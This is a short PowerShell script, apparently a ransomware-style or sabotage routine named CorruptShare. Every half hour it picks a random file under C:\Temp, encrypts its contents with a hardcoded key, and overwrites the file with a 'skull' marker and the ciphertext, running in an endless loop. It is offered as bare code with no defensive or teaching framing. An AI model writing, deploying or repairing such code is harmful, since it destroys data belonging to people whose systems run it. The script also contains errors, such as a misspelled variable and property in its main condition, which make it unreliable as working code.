function CorruptShare {
	$Share = "C:\Temp";
	$Sleep = 1800;
    $key = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
    $semaphore = "skull"
	While($true)
	{
		$files = Get-ChildItem -Path $Share -Recurse | Select-Object FullName;
		if ($files.length -gt 0) {
            $sample = $files | Get-Random -Count 1;
            $plain = Get-Content -Force -Encoding byte -TotalCount 60000 $sample.FullName;
            if (($plan.lenght -gt 0) -and ($plain.Substring(0,$semaphore.length) -ne $semaphore)) {
                $encrypt = ConvertFrom-SecureString -SecureString (ConvertTo-SecureString $plain -AsPlainText -Force) -Key $key
                Set-Content -Path $sample -value "${semaphore}${encrypt}";
			    Write-Host $sample;
            }
		}
		Start-Sleep $Sleep;
	}
}
